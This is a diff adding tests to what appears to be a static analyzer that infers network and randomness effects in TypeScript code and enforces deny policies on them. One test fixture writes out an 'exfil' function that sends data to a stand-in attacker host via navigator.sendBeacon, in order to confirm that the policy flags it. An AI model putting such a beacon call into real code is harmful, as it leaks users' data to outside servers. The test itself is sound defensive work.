@@ -10551,6 +10551,35 @@ if (blk()) {
         !eff(r2, "shadowDirect") && !eff(r2, "shadowAliased"),
         JSON.stringify((r2.functions || []).map((f) => f.fn)));
 
+  // THE `new` PATH IS THE SAME DEFECT, ONE NODE TYPE OVER. The first version of this fix unwrapped
+  // aliases for CALLS only, so `const W = WebSocket; new W(url)` stayed silent — my own fix's sibling,
+  // found by sweeping the alias spelling across every effect-global rather than trusting the first one.
+  run(`export function ws() { const W = WebSocket; return new W("wss://d.example.com"); }\n`
+    + `export function es() { const E = EventSource; return new E("https://f.example.com"); }\n`,
+      "--out", path.join(d, "r"));
+  const rNew = rep();
+  check("`const W = WebSocket; new W(url)` is Net — the ctor path unwraps the alias through the SAME shared helper the call path uses",
+        (eff(rNew, "ws")?.inferred || []).includes("Net") && (eff(rNew, "es")?.inferred || []).includes("Net"),
+        JSON.stringify((rNew.functions || []).map((f) => [f.fn, f.inferred])));
+
+  // TWO GLOBALS THAT WERE MISSING ENTIRELY — found by asking the alias question, answered by the DIRECT
+  // call being silent too. `sendBeacon` is the analytics exfiltration primitive: it exists to POST data
+  // to a server on unload, and `deny Net` answered exit 0 over it.
+  fs.writeFileSync(path.join(d, "pol2"), "deny Net\n");
+  const beacon = run(`export function exfil(data: string): void {\n`
+                   + `  navigator.sendBeacon("https://evil.example.com/collect", data);\n}\n`,
+                     "--policy", path.join(d, "pol2"));
+  check("`navigator.sendBeacon(url, data)` is Net — `deny Net` FIRES over the analytics exfiltration primitive",
+        beacon.status === 1, `status=${beacon.status}`);
+  fs.writeFileSync(path.join(d, "pol3"), "deny Rand\n");
+  const rand = run(`export function key(): Uint8Array { return crypto.getRandomValues(new Uint8Array(32)); }\n`,
+                   "--policy", path.join(d, "pol3"));
+  check("`crypto.getRandomValues` is Rand — the Web Crypto RNG resolves to lib.dom and was charged nothing, while node's imported `randomBytes` was always charged",
+        rand.status === 1, `status=${rand.status}`);
+  run(`export function beaconRuntime(u: string, d2: string) { navigator.sendBeacon(u, d2); }\n`, "--out", path.join(d, "r"));
+  check("…and a sendBeacon with a RUNTIME url marks `incomplete: Net` — a destination nobody can see must not be certifiable by an allowlist",
+        (eff(rep(), "beaconRuntime")?.incomplete || []).includes("Net"), JSON.stringify(eff(rep(), "beaconRuntime")));
+
   // CONTROL 2: aliasing an ordinary function must not become an effect.
   run(`function helper(x: number): number { return x + 1; }\n`
     + `export function pureAlias() { const g = helper; return g(1); }\n`, "--out", path.join(d, "r"));
